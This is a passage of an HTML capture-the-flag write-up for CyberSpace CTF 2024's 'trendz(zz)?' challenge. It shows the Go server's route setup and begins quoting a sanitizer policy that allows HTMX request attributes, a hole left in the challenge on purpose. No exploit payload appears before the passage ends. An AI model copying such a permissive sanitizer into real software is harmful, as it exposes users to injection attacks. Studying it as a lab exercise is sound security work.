<!DOCTYPE html><!--_83vPXOkMR3lkYoiZBeYt--><html class="dark scroll-smooth"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/154fc5c9afe7044c.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-d11e0b30904b49ad.js"/><script src="/_next/static/chunks/4bd1b696-9911af18dede28aa.js" async=""></script><script src="/_next/static/chunks/964-2bcac1827bbf29c7.js" async=""></script><script src="/_next/static/chunks/main-app-771e5b53791411ad.js" async=""></script><script src="/_next/static/chunks/874-3e820bd666038662.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js" async=""></script><script src="/_next/static/chunks/bc9c3264-6371ca03223855d4.js" async=""></script><script src="/_next/static/chunks/48507feb-8452885980bba250.js" async=""></script><script src="/_next/static/chunks/08ffe114-f47006c90e36a3eb.js" async=""></script><script src="/_next/static/chunks/800-bd0deb6e7b7e903a.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/page-54fe20cc7a9d3224.js" async=""></script><meta name="next-size-adjust" content=""/><title>CyberSpace CTF 2024 — trendz(zz)? | kevin.fish</title><meta name="description" content="The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it."/><meta property="og:title" content="CyberSpace CTF 2024 — trendz(zz)?"/><meta property="og:description" content="The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it."/><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="CyberSpace CTF 2024 — trendz(zz)?"/><meta name="twitter:description" content="The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it."/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><div hidden=""><!--$--><!--/$--></div><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/writeups">← Back to writeups</a><div><main class="text-pretty max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-4 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_ol]:list-decimal [&amp;_ol]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>CyberSpace CTF 2024 — trendz(zz)?</h1>
<blockquote>
<p>The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.</p>
</blockquote>
<blockquote>
<p>Notice anything off in this application? If you suspect something is wrong, report it to the superadmin. You never know what secrets might be uncovered.</p>
<p><code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">nc trendz-bot.challs.csc.tf 1337</code></p>
</blockquote>
<p>We&#x27;re given a Go server that looks like this:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M1.811 10.231c-.047 0-.058-.023-.035-.059l.246-.315c.023-.035.081-.058.128-.058h4.172c.046 0 .058.035.035.07l-.199.303c-.023.036-.082.07-.117.07zM.047 11.306c-.047 0-.059-.023-.035-.058l.245-.316c.023-.035.082-.058.129-.058h5.328c.047 0 .07.035.058.07l-.093.28c-.012.047-.058.07-.105.07zm2.828 1.075c-.047 0-.059-.035-.035-.07l.163-.292c.023-.035.07-.07.117-.07h2.337c.047 0 .07.035.07.082l-.023.28c0 .047-.047.082-.082.082zm12.129-2.36c-.736.187-1.239.327-1.963.514-.176.046-.187.058-.34-.117-.174-.199-.303-.327-.548-.444-.737-.362-1.45-.257-2.115.175-.795.514-1.204 1.274-1.192 2.22.011.935.654 1.706 1.577 1.835.795.105 1.46-.175 1.987-.77.105-.13.198-.27.315-.434H10.47c-.245 0-.304-.152-.222-.35.152-.362.432-.97.596-1.274a.315.315 0 01.292-.187h4.253c-.023.316-.023.631-.07.947a4.983 4.983 0 01-.958 2.29c-.841 1.11-1.94 1.8-3.33 1.986-1.145.152-2.209-.07-3.143-.77-.865-.655-1.356-1.52-1.484-2.595-.152-1.274.222-2.419.993-3.424.83-1.086 1.928-1.776 3.272-2.02 1.098-.2 2.15-.07 3.096.571.62.41 1.063.97 1.356 1.648.07.105.023.164-.117.2m3.868 6.461c-1.064-.024-2.034-.328-2.852-1.029a3.665 3.665 0 01-1.262-2.255c-.21-1.32.152-2.489.947-3.529.853-1.122 1.881-1.706 3.272-1.95 1.192-.21 2.314-.095 3.33.595.923.63 1.496 1.484 1.648 2.605.198 1.578-.257 2.863-1.344 3.962-.771.783-1.718 1.273-2.805 1.495-.315.06-.63.07-.934.106zm2.78-4.72c-.011-.153-.011-.27-.034-.387-.21-1.157-1.274-1.81-2.384-1.554-1.087.245-1.788.935-2.045 2.033-.21.912.234 1.835 1.075 2.21.643.28 1.285.244 1.905-.07.923-.48 1.425-1.228 1.484-2.233z"></path></svg> <!-- -->go<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">package</span><span class=""> main
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">import</span><span class=""> </span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">	</span><span class="token string">&quot;app/handlers/custom&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">	</span><span class="token string">&quot;app/handlers/dashboard&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">	</span><span class="token string">&quot;app/handlers/db&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">	</span><span class="token string">&quot;app/handlers/jwt&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">	</span><span class="token string">&quot;app/handlers/service&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">	</span><span class="token string">&quot;github.com/gin-gonic/gin&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class=""></span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">	s </span><span class="token operator">:=</span><span class=""> gin</span><span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">	s</span><span class="token punctuation">.</span><span class="token function">LoadHTMLGlob</span><span class="token punctuation">(</span><span class="token string">&quot;templates/*&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">	db</span><span class="token punctuation">.</span><span class="token function">InitDBconn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">	jwt</span><span class="token punctuation">.</span><span class="token function">InitJWT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="">	s</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">c </span><span class="token operator">*</span><span class="">gin</span><span class="token punctuation">.</span><span class="">Context</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">		c</span><span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">	s</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/ping&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">c </span><span class="token operator">*</span><span class="">gin</span><span class="token punctuation">.</span><span class="">Context</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">		c</span><span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class=""> gin</span><span class="token punctuation">.</span><span class="">H</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">			</span><span class="token string">&quot;message&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;pong&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">		</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">	r </span><span class="token operator">:=</span><span class=""> s</span><span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">&quot;/register&quot;</span><span class="token punctuation">,</span><span class=""> service</span><span class="token punctuation">.</span><span class="">CreateUser</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/register&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">c </span><span class="token operator">*</span><span class="">gin</span><span class="token punctuation">.</span><span class="">Context</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">		c</span><span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;register.tmpl&quot;</span><span class="token punctuation">,</span><span class=""> gin</span><span class="token punctuation">.</span><span class="">H</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">,</span><span class=""> service</span><span class="token punctuation">.</span><span class="">LoginUser</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">c </span><span class="token operator">*</span><span class="">gin</span><span class="token punctuation">.</span><span class="">Context</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">		c</span><span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;login.tmpl&quot;</span><span class="token punctuation">,</span><span class=""> gin</span><span class="token punctuation">.</span><span class="">H</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">36</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/getAccessToken&quot;</span><span class="token punctuation">,</span><span class=""> service</span><span class="token punctuation">.</span><span class="">GenerateAccessToken</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">38</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">	authorizedEndpoints </span><span class="token operator">:=</span><span class=""> r</span><span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">&quot;/user&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">	authorizedEndpoints</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">service</span><span class="token punctuation">.</span><span class="token function">AuthorizeAccessToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">	authorizedEndpoints</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/dashboard&quot;</span><span class="token punctuation">,</span><span class=""> dashboard</span><span class="token punctuation">.</span><span class="">UserDashboard</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">	authorizedEndpoints</span><span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">&quot;/posts/create&quot;</span><span class="token punctuation">,</span><span class=""> service</span><span class="token punctuation">.</span><span class="">CreatePost</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">	authorizedEndpoints</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/posts/:postid&quot;</span><span class="token punctuation">,</span><span class=""> service</span><span class="token punctuation">.</span><span class="">ShowPost</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="">	authorizedEndpoints</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/flag&quot;</span><span class="token punctuation">,</span><span class=""> service</span><span class="token punctuation">.</span><span class="">DisplayFlag</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">45</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">	adminEndpoints </span><span class="token operator">:=</span><span class=""> r</span><span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">&quot;/admin&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">	adminEndpoints</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">service</span><span class="token punctuation">.</span><span class="token function">AuthorizeAccessToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="">	adminEndpoints</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">service</span><span class="token punctuation">.</span><span class="token function">ValidateAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="">	adminEndpoints</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/dashboard&quot;</span><span class="token punctuation">,</span><span class=""> dashboard</span><span class="token punctuation">.</span><span class="">AdminDashboard</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">50</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="">	SAEndpoints </span><span class="token operator">:=</span><span class=""> r</span><span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">&quot;/superadmin&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">52</span><span class="">	SAEndpoints</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">service</span><span class="token punctuation">.</span><span class="token function">AuthorizeAccessToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">53</span><span class="">	SAEndpoints</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">service</span><span class="token punctuation">.</span><span class="token function">ValidateAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">54</span><span class="">	SAEndpoints</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">service</span><span class="token punctuation">.</span><span class="token function">AuthorizeRefreshToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">55</span><span class="">	SAEndpoints</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">service</span><span class="token punctuation">.</span><span class="token function">ValidateSuperAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">56</span><span class="">	SAEndpoints</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/viewpost/:postid&quot;</span><span class="token punctuation">,</span><span class=""> dashboard</span><span class="token punctuation">.</span><span class="">ViewPosts</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">57</span><span class="">	SAEndpoints</span><span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">&quot;/dashboard&quot;</span><span class="token punctuation">,</span><span class=""> dashboard</span><span class="token punctuation">.</span><span class="">SuperAdminDashboard</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">58</span><span class="">	s</span><span class="token punctuation">.</span><span class="token function">NoRoute</span><span class="token punctuation">(</span><span class="">custom</span><span class="token punctuation">.</span><span class="">Custom404Handler</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">59</span><span class="">	s</span><span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">&quot;:8000&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">60</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>This is a 3 part challenge: we can make and share posts, and for part 3 we can report &quot;suspicious posts&quot; to the super admin via <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">nc</code>.</p>
<p>Looking in the posts service, we can find a suspicious sanitize function looking like so:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M1.811 10.231c-.047 0-.058-.023-.035-.059l.246-.315c.023-.035.081-.058.128-.058h4.172c.046 0 .058.035.035.07l-.199.303c-.023.036-.082.07-.117.07zM.047 11.306c-.047 0-.059-.023-.035-.058l.245-.316c.023-.035.082-.058.129-.058h5.328c.047 0 .07.035.058.07l-.093.28c-.012.047-.058.07-.105.07zm2.828 1.075c-.047 0-.059-.035-.035-.07l.163-.292c.023-.035.07-.07.117-.07h2.337c.047 0 .07.035.07.082l-.023.28c0 .047-.047.082-.082.082zm12.129-2.36c-.736.187-1.239.327-1.963.514-.176.046-.187.058-.34-.117-.174-.199-.303-.327-.548-.444-.737-.362-1.45-.257-2.115.175-.795.514-1.204 1.274-1.192 2.22.011.935.654 1.706 1.577 1.835.795.105 1.46-.175 1.987-.77.105-.13.198-.27.315-.434H10.47c-.245 0-.304-.152-.222-.35.152-.362.432-.97.596-1.274a.315.315 0 01.292-.187h4.253c-.023.316-.023.631-.07.947a4.983 4.983 0 01-.958 2.29c-.841 1.11-1.94 1.8-3.33 1.986-1.145.152-2.209-.07-3.143-.77-.865-.655-1.356-1.52-1.484-2.595-.152-1.274.222-2.419.993-3.424.83-1.086 1.928-1.776 3.272-2.02 1.098-.2 2.15-.07 3.096.571.62.41 1.063.97 1.356 1.648.07.105.023.164-.117.2m3.868 6.461c-1.064-.024-2.034-.328-2.852-1.029a3.665 3.665 0 01-1.262-2.255c-.21-1.32.152-2.489.947-3.529.853-1.122 1.881-1.706 3.272-1.95 1.192-.21 2.314-.095 3.33.595.923.63 1.496 1.484 1.648 2.605.198 1.578-.257 2.863-1.344 3.962-.771.783-1.718 1.273-2.805 1.495-.315.06-.63.07-.934.106zm2.78-4.72c-.011-.153-.011-.27-.034-.387-.21-1.157-1.274-1.81-2.384-1.554-1.087.245-1.788.935-2.045 2.033-.21.912.234 1.835 1.075 2.21.643.28 1.285.244 1.905-.07.923-.48 1.425-1.228 1.484-2.233z"></path></svg> <!-- -->go<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">func</span><span class=""> </span><span class="token function">SanitizeData</span><span class="token punctuation">(</span><span class="">data </span><span class="token builtin">string</span><span class="token punctuation">)</span><span class=""> </span><span class="token builtin">string</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">	p </span><span class="token operator">:=</span><span class=""> bluemonday</span><span class="token punctuation">.</span><span class="token function">NewPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">	p</span><span class="token punctuation">.</span><span class="token function">AllowURLSchemesMatching</span><span class="token punctuation">(</span><span class="">regexp</span><span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">&quot;^https?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">	p</span><span class="token punctuation">.</span><span class="token function">AllowAttrs</span><span class="token punctuation">(</span><span class="token string">&quot;alt&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;cite&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;datetime&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;dir&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;high&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hx-delete&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hx-get&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hx-patch&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hx-post&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;hx-put&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token 